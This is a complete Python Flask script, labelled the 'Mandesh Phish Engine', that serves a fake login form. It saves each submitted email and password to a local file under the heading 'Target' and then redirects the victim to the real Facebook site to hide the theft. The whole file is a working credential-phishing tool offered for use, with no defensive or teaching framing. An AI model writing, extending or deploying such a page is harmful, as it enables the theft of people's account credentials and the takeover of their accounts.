from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Core logic: Capture data and log it
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('pass')
    with open("credentials.txt", "a") as f:
        f.write(f"Target: {username} | Pass: {password}\n")
    return redirect("https://facebook.com") # Redirect to real site

@app.route('/')
def index():
    # We will build a template folder with different UI options
    return """
    <form action="/login" method="post">
        <input type="text" name="email" placeholder="Email" required><br>
        <input type="password" name="pass" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
    """

if __name__ == "__main__":
    print("[!] Mandesh Phish Engine Starting on Port 8080...")
    app.run(port=8080)
